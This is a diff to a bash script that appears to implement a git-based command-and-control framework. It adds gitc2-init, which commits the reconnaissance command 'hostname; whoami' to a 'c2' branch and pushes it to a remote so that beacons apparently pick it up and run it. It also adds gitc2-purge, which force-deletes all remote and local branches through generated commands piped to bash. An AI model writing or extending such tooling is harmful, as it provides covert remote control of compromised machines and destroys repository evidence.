@@ -159,6 +159,28 @@ _gitc2-parse-beacons () {
 	printf '%s\n' "${beacons[@]}"
 } && export -f _gitc2-parse-beacons
 
+gitc2-init () {
+	err 'Are you sure you want to init the c2 infrastructure? (CTRL-C to abort, enter to continue) '
+	read
+	_git checkout c2
+	GIT_AUTHOR_NAME="in" GIT_AUTHOR_EMAIL="0" \
+		_git commit --allow-empty --message="hostname; whoami"
+	logif 1 && warn "c2: commiting command (0): 'whoami'"
+	_git push c2 c2
+} && export -f gitc2-init
+
+gitc2-purge () {
+	critical 'Are you sure you want to PURGE the c2 infrastructure? (CTRL-C to abort, enter to continue) '
+	read
+	critical '100% sure? (CTRL-C to abort, enter to continue)'
+	read
+	_git checkout --orphan "$(mktemp -u)"
+	git branch --all --format='%(refname:short)' | grep / | grep -v HEAD | sed -e 's|/| :|; s/^/git push --force /' | bash
+	git branch --all --format='%(refname:short)' | grep -v / | sed -e 's/^/git branch -D /' | bash
+	_git checkout c2 || _git checkout --orphan c2 || _git checkout -b c2
+	gitc2-init
+} && export -f gitc2-purge
+
 gitc2-run () {
 	local cmd cmd_id beacon
 	declare -a beacons=()
